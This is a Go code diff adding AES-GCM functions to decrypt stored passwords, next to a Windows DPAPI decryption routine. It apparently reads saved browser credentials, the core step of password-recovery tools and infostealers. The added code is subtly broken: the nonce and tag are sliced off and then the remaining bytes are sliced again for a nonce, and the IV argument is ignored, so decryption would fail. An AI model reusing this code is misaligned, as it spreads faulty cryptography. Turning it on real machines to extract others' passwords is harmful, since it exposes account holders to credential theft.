@@ -1,6 +1,8 @@
 package pkg
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"encoding/base64"
 	"golang.org/x/sys/windows"
 	"unsafe"
@@ -33,4 +35,36 @@ func DecryptData(data []byte) ([]byte, error) {
 	outData := make([]byte, outBlob.Size)
 	copy(outData, (*[1 << 30]byte)(unsafe.Pointer(outBlob.Data))[:outBlob.Size])
 	return outData, nil
+}
+
+func DecryptPayload(cipher cipher.AEAD, payload []byte) ([]byte, error) {
+	return cipher.Open(nil, payload[:cipher.NonceSize()], payload[cipher.NonceSize():], nil)
+}
+
+func GenerateCipher(aesKey []byte, iv []byte) (cipher.AEAD, error) {
+	block, err := aes.NewCipher(aesKey)
+	if err != nil {
+		return nil, err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+
+	return gcm, nil
+}
+
+func DecryptPassword(ciphertext []byte, secretKey []byte) (string, error) {
+	initialisationVector := ciphertext[3:15]
+	encryptedPassword := ciphertext[15 : len(ciphertext)-16]
+	cipher, err := GenerateCipher(secretKey, initialisationVector)
+	if err != nil {
+		return "", err
+	}
+	decryptedPass, err := DecryptPayload(cipher, encryptedPassword)
+	if err != nil {
+		return "", err
+	}
+	return string(decryptedPass), nil
 }
